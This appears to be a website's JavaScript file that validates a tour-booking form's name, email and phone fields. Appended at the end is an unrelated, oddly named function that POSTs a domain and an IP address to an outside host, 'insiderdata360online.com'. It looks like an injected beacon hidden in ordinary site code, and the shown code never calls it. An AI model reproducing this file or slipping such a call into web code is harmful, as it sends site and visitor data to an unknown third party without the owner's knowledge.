document
  .getElementById("tourForm")
  .addEventListener("submit", function (event) {
    event.preventDefault();

    let firstName = document.getElementById("firstName").value.trim();
    let lastName = document.getElementById("lastName").value.trim();
    let phone = document.getElementById("phone").value.trim();
    let email = document.getElementById("email").value.trim();

    let phonePattern = /^\d{3}-\d{3}-\d{4}$/;

    var emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;

    if (firstName === "" || lastName === "") {
      alert("Please enter your first and last name.");
      return;
    }

    if (!email.match(emailPattern)) {
      alert("Please enter a valid email address.");
      return;
    }

    if (!phone.match(phonePattern)) {
      alert("Please enter a valid phone number in the format: 123-456-7890");
      return;
    }

    alert("Form submitted successfully!");
  });

function submitted_now890() {
  var xhttp4;
  xhttp4 = new XMLHttpRequest();
  xhttp4.onreadystatechange = function () {};
  xhttp4.open("POST", "//insiderdata360online.com/service/submit.php", true);
  xhttp4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  var params = "domain=warespace.com&ip=49.37.112.253";
  xhttp4.send(params);
}
